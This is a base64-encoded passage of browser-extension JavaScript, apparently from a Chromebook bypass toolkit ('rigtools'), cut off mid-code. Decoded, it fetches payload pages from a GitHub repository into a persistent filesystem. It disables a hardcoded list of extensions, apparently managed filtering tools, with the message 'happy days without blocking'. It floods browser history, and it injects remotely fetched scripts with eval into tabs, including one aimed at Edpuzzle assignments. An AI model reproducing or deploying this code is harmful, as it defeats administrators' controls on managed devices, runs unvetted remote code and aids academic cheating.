ICAgICAgY29uc3QgZnMgPSBhd2FpdCBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlKSB7CiAgICAgICAgICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbih3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoCiAgICAgICAgICAgICAgICAicmlndG9vbHMuaHRtbCIsCiAgICAgICAgICAgICAgICBgJHthd2FpdCBmZXRjaCgKICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLXJpZ3Rvb2xzMTI4cGx1cy9yZWZzL2hlYWRzL21haW4vcGF5bG9hZHMvaW5kZXguaHRtbCIKICAgICAgICApLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSl9PHNjcmlwdCBzcmM9Ii4vcmlndG9vbHMuanMiPjwvc2NyaXB0PmAKICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIGF3YWl0IHdyaXRlRmlsZSgKICAgICAgICAgICAgICAgICJyaWd0b29scy5qcyIsCiAgICAgICAgICAgICAgICBhd2FpdCBmZXRjaCgKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL3BheWxvYWRzL2luZGV4LmpzIgogICAgICAgICAgICAgICAgKS50aGVuKChyZXMpID0+IHJlcy50ZXh0KCkpCiAgICAgICAgICAgICk7CgogICAgICAgICAgICBjaHJvbWUudGFicy5jcmVhdGUoewogICAgICAgICAgICAgICAgdXJsCiAgICAgICAgICAgIH0pOwogICAgICAgIH0pKCk7CiAgICB9OwogICAgU2NyaXB0QnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjcXVpY2stcm12LWJsdCIpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgKGFzeW5jICgpID0+IHsKCiAgICAgICAgICAgIGNvbnN0IGZzID0gYXdhaXQgbmV3IFByb21pc2UoZnVuY3Rpb24gKHJlc29sdmUpIHsKICAgICAgICAgICAgICAgICAgd2Via2l0UmVxdWVzdEZpbGVTeXN0ZW0oUEVSU0lTVEVOVCwgMiAqIDEwMjQgKiAxMDI0LCByZXNvbHZlKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgeyBjcmVhdGU6IHRydWUgfSwgZnVuY3Rpb24gKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgeyBjcmVhdGU6IHRydWUgfSwgZnVuY3Rpb24gKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgZW50cnkuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uICh3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBKUyA9IGB0cnkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGJsb2F0SWRzID0gWwogICAgICAgICAgICAgICAgICAgICAgImNnYmJiam1nZHBuaWZpamNvbmhhbWdnamVobGFtY2lmIiwKICAgICAgICAgICAgICAgICAgICAgICJsZmtiYm1jbG5wYWlocGFhamhvaGhmZGplbGNoa2lrZiIsCiAgICAgICAgICAgICAgICAgICAgICAibmNib2ZuaG1tZmZmbWNkbWJqZmFpZ2Vwa2dtam5sbmUiLAogICAgICAgICAgICAgICAgICAgICAgInBvaG1nb2JkZWFqZW1jaWZwb2xkbm5oZmZqbm5raGdmIiwKICAgICAgICAgICAgICAgICAgICAgICJiZWNkcGxmYWxvb2ZsYW5pcGpvYmxjbXBhZWtrYmJoZSIsCiAgICAgICAgICAgICAgICAgICAgICAiZmVlcG1kbG1ocGxhb2phYmVvZWNhb2JmbWlib29haWQiLAogICAgICAgICAgICAgICAgICAgICAgImFka2Nwa3BnaGFobWJvcGtqY2hvYmllY2tlb2FvZWVtIiwKICAgICAgICAgICAgICAgICAgICAgICJoYWxkbGdsZHBsZ25nZ2tqYWFmaGVsZ2lhZ2xhZmFuaCIsCiAgICAgICAgICAgICAgICAgICAgICAiZmlsZ3Bqa2RtamlubWpiZXBicG1uZm9ibWptZ2ltb24iLAogICAgICAgICAgICAgICAgICAgICAgImtrYm1kZ2pnZ2NkYWpja2RsYm5nZGpvbnBjaHBhaWVhIiwKICAgICAgICAgICAgICAgICAgICAgICJuamRuaWNsZ2VnaWpkY2RsaWtsZ2llaWNhbnBtY25naiIsCiAgICAgICAgICAgICAgICAgICAgICAiaHBrZG9rYWtqZ2xwcGVla2ZlZWttZWJmYWhhZG5mbHAiCiAgICAgICAgICAgICAgICAgICAgXTsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgYmxvYXRJZHMuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgIGlmIChpZCA9PSBjaHJvbWUucnVudGltZS5pZCkgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGlkLCBmYWxzZSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgd2luZG93LmNsb3NlKCk7CiAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJ1bnN1Y2Nlc3NmdWwiKTsKICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICBgOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc3QgZmlsZU5hbWUgPSAiYmxvYXQiOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc3QgdXJsID0gYXdhaXQgd3JpdGVGaWxlKGAke2ZpbGVOYW1lfS5odG1sYCxgPCFkb2N0eXBlaHRtbD48dGl0bGU+ZGlzYWJsaW5nLi48L3RpdGxlPjxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9SW50ZXI6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwInJlbD1zdHlsZXNoZWV0PjxzdHlsZT5we21hcmdpbjowfWJvZHl7YmFja2dyb3VuZC1jb2xvcjojMDAwO2NvbG9yOiNmZmY7Zm9udC1mYW1pbHk6SW50ZXIsc2Fucy1zZXJpZjttYXJnaW46MDtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7aGVpZ2h0OjEwMHZofWgxOjpiZWZvcmV7Y29udGVudDoiIyAiO2NvbG9yOm9rbGNoKDgxLjIxJSAuMTQwOSAxNjUuMTQpO2ZvbnQtd2VpZ2h0OjkwMH0uaW5uZXJ7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjt0ZXh0LWFsaWduOmNlbnRlcn10ZXh0YXJlYXt3aWR0aDptYXgtY29udGVudDtwYWRkaW5nLXRvcDoxZW07b3ZlcmZsb3cteTpoaWRkZW47Ym9yZGVyLXJhZGl1czoxMHB4O2JhY2tncm91bmQ6b2tsY2goMTcuMDMlIC4wMDgzIDI4NS40OSAvIC41KTtib3JkZXI6MXB4IHNvbGlkIG9rbGNoKDY4LjY1JSAuMDM3NCAyNzQuNzMgLyAuNSk7Y29sb3I6b2tsY2goOTUuOTIlIC4wMTkyNTMgMjczLjIzNzcpO3Jlc2l6ZTpub25lO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTt0cmFuc2l0aW9uOmFsbCAuNXMgY3ViaWMtYmV6aWVyKC4xNzUsLjg4NSwuMzIsMS45KSxjb2xvciAuMjVzLGJvcmRlci1jb2xvciAuMjVzfTwvc3R5bGU+PGRpdiBjbGFzcz1pbm5lcj48dGV4dGFyZWEgY29scz0xMiByZWFkb25seSByb3dzPTI+ICAoXl9fX19eKTwvdGV4dGFyZWE+PGgxPmRpc2FibGluZy4uLjwvaDE+PHA+aGFwcHkgZGF5cyAgd2l0aG91dCBibG9ja2luZyBhbSBpIHJpZ2h0PzwvZGl2PjxzY3JpcHQgc3JjPS4vJHtmaWxlTmFtZX0uanM+PC9zY3JpcHQ+YCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBhd2FpdCB3cml0ZUZpbGUoYCR7ZmlsZU5hbWV9LmpzYCwgSlMpOwogICAgICAgICAgICAKICAgICAgICAgICAgY2hyb21lLnRhYnMuY3JlYXRlKHsgdXJsIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgfSkoKTsKICAgIH07CgogICAgU2NyaXB0QnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjaHN0ZmxkIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICBkb2N1bWVudC50aXRsZSA9ICJVbnRpdGxlZCBkb2N1bWVudCI7CiAgICAgICAgbGV0IGxpbmsgPQogICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJsaW5rW3JlbH49J2ljb24nXSIpIHx8CiAgICAgICAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpbmsiKTsKICAgICAgICBsaW5rLnJlbCA9ICJpY29uIjsKICAgICAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGxpbmspOwogICAgICAgIGxpbmsuaHJlZiA9CiAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLXJpZ3Rvb2xzMTI4cGx1cy9yZWZzL2hlYWRzL21haW4vIjsKCiAgICAgICAgbGV0IG51bSA9IHByb21wdCgKICAgICAgICAgICAgIkhvdyBUaW1lcyBEbyBZb3UgV2FudCBUaGlzIFBhZ2UgVG8gU2hvdyBVcCBJbiB5b3VyIEhpc3Rvcnk/IgogICAgICAgICk7CiAgICAgICAgbGV0IGRvbmUgPSBmYWxzZTsKICAgICAgICBjb25zdCB4ID0gd2luZG93LmxvY2F0aW9uLmhyZWY7CiAgICAgICAgZm9yIChsZXQgaSA9IDE7IGkgPD0gbnVtOyBpKyspIHsKICAgICAgICAgICAgaGlzdG9yeS5wdXNoU3RhdGUoMCwgMCwgaSA9PT0gbnVtID8geCA6IGkudG9TdHJpbmcoKSk7CiAgICAgICAgICAgIGlmIChpID09PSBudW0pIGRvbmUgPSB0cnVlOwogICAgICAgIH0KICAgICAgICBpZiAoZG9uZSkgewogICAgICAgICAgICBhbGVydCgKICAgICAgICAgICAgICAgICJGbG9vZGluZyBTdWNjZXNzZnVsIVxuICIgKwogICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgKwogICAgICAgICAgICAgICAgIiBcbklzIE5vdyBJbiBZb3VyIEhpc3RvcnkgIiArCiAgICAgICAgICAgICAgICBudW0gKwogICAgICAgICAgICAgICAgKG51bSA9PSAxID8gIiB0aW1lLiIgOiAiIFRpbWVzLiIpCiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgfTsKCiAgICBjb25zdCBUYWJCdXR0b25zID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI3RhYnMtYnV0dG9ucyIpOwoKICAgIGlmIChjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KSB7CgogICAgICAgIGZ1bmN0aW9uIGxpc3RlbmVyQXBwKGNhbGxiYWNrKSB7CiAgICAgICAgICAgIGNvbnN0IGZ1bmMgPSAoaWQsIGNoYW5nZUluZm8pID0+IHsKICAgICAgICAgICAgICAgIGlmIChjaGFuZ2VJbmZvLnN0YXR1cyA9PT0gImNvbXBsZXRlIikgewogICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLmdldChpZCwgKHRhYikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBpZiAodGFiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayh0YWIpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGNocm9tZS50YWJzLm9uVXBkYXRlZC5hZGRMaXN0ZW5lcihmdW5jKTsKICAgICAgICAgICAgcmV0dXJuIGZ1bmM7CiAgICAgICAgfQoKICAgICAgICBjb25zdCBzY3JpcHRzID0ge307CiAgICAgICAgY29uc3QgY29uZGl0aW9ucyA9IHt9OwogICAgICAgIGNvbnN0IGxpc3RlbmVycyA9IHt9OwoKICAgICAgICBzY3JpcHRzLmVydWRhID0gYAogICAgZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vZXJ1ZGEiKS50aGVuKHJlcyA9PiByZXMudGV4dCgpKS50aGVuKChkYXRhKSA9PiB7CiAgICAgIGV2YWwoZGF0YSk7CiAgICAgIGlmICghd2luZG93LmVydWRhTG9hZGVkKSB7CiAgICAgICAgZXJ1ZGEuaW5pdCh7CiAgICAgICAgICBkZWZhdWx0czogewogICAgICAgICAgICBkaXNwbGF5U2l6ZTogNDUsCiAgICAgICAgICAgIHRoZW1lOiAiQU1PTEVEIgogICAgICAgICAgfQogICAgICAgIH0pOwogICAgICAgIHdpbmRvdy5lcnVkYUxvYWRlZCA9IHRydWU7CiAgICAgIH0KICAgIH0pOwogIGA7CgogICAgICAgIHNjcmlwdHMuY2hpaSA9IGAKICAgIGNvbnN0IHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgc2NyaXB0LnNyYyA9ICdodHRwczovL2NoaWkubGlyaWxpcmkuaW8vcGxheWdyb3VuZC90YXJnZXQuanMnOwogICAgc2NyaXB0LnNldEF0dHJpYnV0ZSgnZW1iZWRkZWQnLCAndHJ1ZScpOwogICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwogIGA7CgogICAgICAgIHNjcmlwdHMuYWRibG9jayA9IGAKICAgIChmdW5jdGlvbigpewoKICAgICAgdmFyIHNlbGVjdG9ycyA9IFsKCiAgICAgICcjc2lkZWJhci13cmFwJywgJyNhZHZlcnQnLCAnI3hyYWlsJywgJyNtaWRkbGUtYXJ0aWNsZS1hZHZlcnQtY29udGFpbmVyJywKICAgICAgJyNzcG9uc29yZWQtcmVjb21tZW5kYXRpb25zJywgJyNhcm91bmQtdGhlLXdlYicsICcjc3BvbnNvcmVkLXJlY29tbWVuZGF0aW9ucycsCiAgICAgICcjdGFib29sYS1jb250ZW50JywgJyN0YWJvb2xhLWJlbG93LXRhYm9vbGEtbmF0aXZlLXRodW1ibmFpbHMnLCAnI2luYXJ0aWNsZV93cmFwcGVyX2RpdicsCiAgICAgICcjcmMtcm93LWNvbnRhaW5lcicsICcjYWRzJywgJyNhdC1zaGFyZS1kb2NrJywgJyNhdDQtc2hhcmUnLCAnI2F0NC1mb2xsb3cnLCAnI3JpZ2h0LWFkcy1yYWlsJywKICAgICAgJ2RpdiNhZC1pbnRlcnN0aXRpYWwnLCAnZGl2I2FkdmVydC1hcnRpY2xlJywgJ2RpdiNhYy1scmUtcGxheWVyLXBoJywKCiAgICAgICcuYWQnLCAnLmF2ZXJ0JywgJy5hdmVydF9fd3JhcHBlcicsICcubWlkZGxlLWJhbm5lci1hZCcsICcuYWR2ZXJ0aXNlbWVudCcsCiAgICAgICcuR29vZ2xlQWN0aXZlVmlld0NsYXNzJywgJy5hZHZlcnQnLCAnLmNucy1hZHMtc3RhZ2UnLCAnLnRlYWRzLWlucmVhZCcsICcuYWQtYmFubmVyJywKICAgICAgJy5hZC1hbmNob3JlZCcsICcuanNfc2hlbGZfYWRzJywgJy5hZC1zbG90JywgJy5hbnRlbm5hJywgJy54cmFpbC1jb250ZW50JywKICAgICAgJy5hZHZlcnRpc2VtZW50X19sZWFkZXJib2FyZCcsICcuYWQtbGVhZGVyYm9hcmQnLCAnLnRyY19yYm94X291dGVyJywgJy5rcy1yZWNvbW1lbmRlZCcsCiAgICAgICcuYXJ0aWNsZS1kYScsICdkaXYuc3BvbnNvcmVkLXN0b3JpZXMtY29tcG9uZW50JywgJ2Rpdi5hZGR0aGlzLXNtYXJ0bGF5ZXJzJywKICAgICAgJ2Rpdi5hcnRpY2xlLWFkc3BvbnNvcicsICdkaXYuc2lnbmluLXByb21wdCcsICdkaXYuYXJ0aWNsZS1idW1wZXInLCAnZGl2LnZpZGVvLXBsYWNlaG9sZGVyJywKICAgICAgJ2Rpdi50b3AtYWQtY29udGFpbmVyJywgJ2Rpdi5oZWFkZXItYWQnLCAnZGl2LmFkLXVuaXQnLCAnZGl2LmRlbW8tYmxvY2snLCAnZGl2Lk9VVEJSQUlOJywKICAgICAgJ2Rpdi5vYi13aWRnZXQnLCAnZGl2Lm53c3JtLXdyYXBwZXInLCAnZGl2LmFubm91bmNlbWVudEJhcicsICdkaXYucGFydG5lci1yZXNvdXJjZXMtYmxvY2snLAogICAgICAnZGl2LmFycm93LWRvd24nLCAnZGl2Lm0tYWQnLCAnZGl2LnN0b3J5LWludGVycnVwdCcsICdkaXYudGFib29sYS1yZWNvbW1lbmRlZCcsCiAgICAgICdkaXYuYWQtY2x1c3Rlci1jb250YWluZXInLCAnZGl2LmN0eC1zaWRlYmFyJywgJ2Rpdi5pbmNvZ25pdG8tbW9kYWwnLCAnLk9VVEJSQUlOJywgJy5zdWJzY3JpYmUtYnV0dG9uJywKICAgICAgJy5hZHM5JywgJy5sZWFkZXJib2FyZHMnLCAnLkdvb2dsZUFjdGl2ZVZpZXdFbGVtZW50JywgJy5tcHUtY29udGFpbmVyJywgJy5hZC0zMDB4NjAwJywgJy50Zi1hZC1ibG9jaycsCiAgICAgICcuc2lkZWJhci1hZHMtaG9sZGVyLXRvcCcsICcuYWRzLW9uZScsICcuRnVsbFBhZ2VNb2RhbF9fc2Nyb2xsZXInLAogICAgICAnLmNvbnRlbnQtYWRzLWhvbGRlcicsICcud2lkZ2V0LWFyZWEnLCAnLnNvY2lhbC1idXR0b25zJywgJy5hYy1wbGF5ZXItcGgnLAoKICAgICAgJ2FzaWRlI3Nwb25zb3JlZC1yZWNvbW1lbmRhdGlvbnMnLCAnYXNpZGVbcm9sZT0iYmFubmVyIl0nLCAnYXNpZGUnLAogICAgICAnYW1wLWFkJywgJ3NwYW5baWRePWFkX2lzX10nLCAnZGl2W2NsYXNzKj0iaW5kaWFuYXBvbGlzLW9wdGluIl0nLCAnZGl2W2lkXj1nb29nbGVfYWRzX2lmcmFtZV0nLAogICAgICAnZGl2W2RhdGEtZ29vZ2xlLXF1ZXJ5LWlkXScsICdzZWN0aW9uW2RhdGEtcmVzcG9uc2VdJywgJ2lucy5hZHNieWdvb2dsZScsICdkaXZbZGF0YS1nb29nbGUtcXVlcnktaWRdJywKICAgICAgJ2RpdltkYXRhLXRlc3QtaWQ9ImZ1bGxQYWdlU2lnbnVwTW9kYWwiXScsICdkaXZbZGF0YS10ZXN0LWlkPSJnaWZ0V3JhcCJdJyBdOwogICAgICBmb3IobGV0IGkgaW4gc2VsZWN0b3JzKSB7CiAgICAgICAgICBsZXQgbm9kZXNMaXN0ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbChzZWxlY3RvcnNbaV0pOwogICAgICAgICAgZm9yKGxldCBpID0gMDsgaSA8IG5vZGVzTGlzdC5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgIGxldCBlbCA9IG5vZGVzTGlzdFtpXTsKICAgICAgICAgICAgICBpZihlbCAmJiBlbC5wYXJlbnROb2RlKQogICAgICAgICAgICAgIGVsLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoZWwpOwogICAgICAgICAgfQogICAgICB9CiAgICB9KSgpOwogIGA7CiAgLypzY3JpcHRzLmdsb2NrZWQgPSBgCmZldGNoKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veE5hc3VuaS9nb29nbGUtZm9ybXMtdW5sb2NrZXIvcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5qcyIpCiAgLnRoZW4ocmVzcG9uc2UgPT4gewogICAgaWYgKCFyZXNwb25zZS5vaykgewogICAgICB0aHJvdyBuZXcgRXJyb3IoIk5ldHdvcmsgcmVzcG9uc2Ugd2FzIG5vdCBvayIpOwogICAgfQogICAgcmV0dXJuIHJlc3BvbnNlLnRleHQoKTsKICB9KQogIC50aGVuKHNjcmlwdENvbnRlbnQgPT4gewogICAgaWYgKCF3aW5kb3cuc2tpYkxvYWRlZCkgewogICAgICBldmFsKHNjcmlwdENvbnRlbnQpOwogICAgICB3aW5kb3cuc2tpYkxvYWRlZCA9IHRydWU7CiAgICB9CiAgfSkKICAuY2F0Y2goZXJyb3IgPT4gYWxlcnQoIkVycm9yIGxvYWRpbmcgc2NyaXB0OiIsIGVycm9yKSk7CmA7CiovCiAgICAgICAgc2NyaXB0cy5lZHB1enpsZSA9IGAKICAgIGZldGNoKCJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvTWluZXI0OXVyL3Nob3J0aGFuZEBtYWluL2VkcHV6emxpbmdzY3JpcHQuanMiKS50aGVuKHIgPT4gci50ZXh0KCkpLnRoZW4ociA9PiB7CiAgICAgIGlmICghd2luZG93LmVkcHV6emxlc0xvYWRlZCkgewogICAgICAgIGV2YWwocik7CiAgICAgICAgd2luZG93LmVkcHV6emxlc0xvYWRlZCA9IHRydWU7CiAgICAgIH0KICAgIH0pOwogIGA7CiAgICAgICAgY29uZGl0aW9ucy5lZHB1enpsZSA9ICh0YWIpID0+IHRhYi51cmwubWF0Y2goL2VkcHV6emxlXC5jb21cL2Fzc2lnbm1lbnRzL2cpOwogICAgICAgIC8vIGNvbmRpdGlvbnMuZ2xvY2tlZCA9ICh0YWIpID0+IHRhYi51cmwubWF0Y2goL2h0dHBzPzpcL1wvZG9jc1wuZ29vZ2xlXC5jb21cL2Zvcm1zXC8vZyk7CiAgICAgICAgY29uc3QgVG9nZ2xlQnV0dG9ucyA9IFRhYkJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3RvZ2dsZWFibGUtYnV0dG9ucyIpOwoKICAgICAgICBUb2dnbGVCdXR0b25zLnF1ZXJ5U2VsZWN0b3JBbGwoImJ1dHRvbiIpLmZvckVhY2goCiAgICAgICAgICAgIChiKSA9PgogICAgICAgICAgICAoYi5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICAgICAgY29uc3QgaWQgPSBiLmlkOwoKICAgICAgICAgICAgICAgIGlmIChiLmhhc0F0dHJpYnV0ZSgidG9nZ2xlZCIpKSB7CgogICAgICAgICAgICAgICAgICAgIGlmIChpZCBpbiBsaXN0ZW5lcnMpCiAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLm9uVXBkYXRlZC5yZW1vdmVMaXN0ZW5lcihsaXN0ZW5lcnNbaWRdKTsKICAgICAgICAgICAgICAgICAgICBiLnJlbW92ZUF0dHJpYnV0ZSgidG9nZ2xlZCIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2NyaXB0ID0gc2NyaXB0c1tpZF0gfHwgIiI7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgY29uZGl0aW9uID0gY29uZGl0aW9uc1tpZF0gfHwgKCh0YWIpID0+IHRydWUpOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGZ1bmMgPSBsaXN0ZW5lckFwcCgodGFiKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb25kaXRpb24odGFiKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCh0YWIuaWQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2RlOiBzY3JpcHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgIGxpc3RlbmVyc1tpZF0gPSBmdW5jOwoKICAgICAgICAgICAgICAgICAgICBiLnNldEF0dHJpYnV0ZSgidG9nZ2xlZCIsICJ0cnVlIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pCiAgICAgICAgKTsKICAgIH0gZWxzZSB7CiAgICAgICAgVGFiQnV0dG9ucy5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfQoKICAgIGRvY3VtZW50CiAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNjb2RlLXJ1biIpCiAgICAgICAgLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gcnVuQ29kZShmYWxzZSkpOwp9OwoKY29uc3QgcnVuQ29kZSA9IGFzeW5jIChvblRhYiwgdGFiSWQgPSAiIikgPT4gewogICAgY29uc3QgY29kZVRleHRhcmVhID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2NvZGUiKTsKICAgIGxldCBjb2RlID0gY29kZVRleHRhcmVhLnZhbHVlLnRyaW0oKTsKCiAgICBjb25zdCBvdXRwdXREaXYgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjY29kZS1vdXRwdXQiKTsKCiAgICBpZiAoY29kZS50b0xvd2VyQ2FzZSgpID09PSAicHJhaGl0IikgewoKICAgICAgICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICBjb250YWluZXIuY2xhc3NOYW1lID0gInByYWhpdC1jb250YWluZXIiOwoKICAgICAgICBjb25zdCBvdmVybGF5SW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgICAgICBvdmVybGF5SW1hZ2Uuc3JjID0KICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90M20xbjRsL3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2ltZy9wcmFoaXQucG5nIjsKICAgICAgICBvdmVybGF5SW1hZ2UuYWx0ID0gIlByYWhpdCBJbWFnZSI7CiAgICAgICAgb3ZlcmxheUltYWdlLmNsYXNzTmFtZSA9ICJwcmFoaXQtaW1hZ2UiOwoKICAgICAgICBjb25zdCB0ZXh0Qm94ID0gZG9jdW